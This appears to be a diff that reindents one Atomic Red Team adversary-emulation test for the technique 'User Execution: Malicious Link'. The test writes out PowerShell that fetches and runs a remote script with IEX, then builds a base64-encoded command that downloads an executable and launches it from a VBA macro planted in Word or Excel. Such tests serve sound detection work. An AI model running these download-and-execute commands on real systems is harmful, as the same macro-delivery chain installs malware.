@@ -1,57 +1,57 @@
 attack_technique: T1204.002
 display_name: 'User Execution: Malicious Link'
 atomic_tests:
--   -   name: Maldoc powershell encoded command execution
-        auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
-        description: |
-            This Test uses a VBA macro to execute cmd to launch powershell to download a "first stage" benign malware. The benign executable will launch windows shell, powershell and reach out to api.ipify.org and google.com before exiting.
-            Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
-        supported_platforms:
-        -   windows
-        input_arguments:
-            ms_product:
-                description: Maldoc application Word or Excel
-                type: String
-                default: Word
-            ms_office_version:
-                description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
-                type: String
-                default: '16.0'
-            executable_name:
-                description: Name of the final executable powershell will start
-                type: String
-                default: 168.exe
-            download_url:
-                description: Where to download the executable
-                type: Url
-                default: https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe
-            executable_location:
-                description: Where to save the downloaded executable
-                type: String
-                default: $env:temp\
-        dependency_executor_name: powershell
-        dependencies:
-        -   description: |
-                Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
-            prereq_command: |
-                If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
-            get_prereq_command: |
-                $msword = New-Object -ComObject word.application
-                Stop-Process -Name WINWORD
-        executor:
-            command: |
-                IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
-                $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
-                $Command = "$client = new-object System.Net.WebClient; $client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
-                $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
-                $EncodedCommand = [Convert]::ToBase64String($Bytes)
-                $macrocode = "Shell `"powershell.exe -EncodedCommand $EncodedCommand`""
-                Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
-            cleanup_command: |
-                Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
-                $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
-                Remove-Item $ExecutablePath -ErroAction Ignore
-            name: powershell
+-   name: Maldoc powershell encoded command execution
+    auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
+    description: |
+        This Test uses a VBA macro to execute cmd to launch powershell to download a "first stage" benign malware. The benign executable will launch windows shell, powershell and reach out to api.ipify.org and google.com before exiting.
+        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
+    supported_platforms:
+    -   windows
+    input_arguments:
+        ms_product:
+            description: Maldoc application Word or Excel
+            type: String
+            default: Word
+        ms_office_version:
+            description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+            type: String
+            default: '16.0'
+        executable_name:
+            description: Name of the final executable powershell will start
+            type: String
+            default: 168.exe
+        download_url:
+            description: Where to download the executable
+            type: Url
+            default: https://raw.githubusercontent.com/CyborgSecurity/atomic-red-team/Cyborg/atomics/T1204.002/bin/168.exe
+        executable_location:
+            description: Where to save the downloaded executable
+            type: String
+            default: $env:temp\
+    dependency_executor_name: powershell
+    dependencies:
+    -   description: |
+            Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependant registry keys
+        prereq_command: |
+            If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+        get_prereq_command: |
+            $msword = New-Object -ComObject word.application
+            Stop-Process -Name WINWORD
+    executor:
+        command: |
+            IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1")
+            $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
+            $Command = "$client = new-object System.Net.WebClient; $client.DownloadFile(`"#{download_url}`",`"$ExecutablePath`"); Start-Process -Filepath `"$ExecutablePath`""
+            $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Command)
+            $EncodedCommand = [Convert]::ToBase64String($Bytes)
+            $macrocode = "Shell `"powershell.exe -EncodedCommand $EncodedCommand`""
+            Invoke-MalDoc $macrocode "#{ms_office_version}" "#{ms_product}"
+        cleanup_command: |
+            Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+            $ExecutablePath = Join-Path -Path #{executable_location} -ChildPath #{executable_name}
+            Remove-Item $ExecutablePath -ErroAction Ignore
+        name: powershell
 -   name: OSTap Style Macro Execution
     auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
     description: |
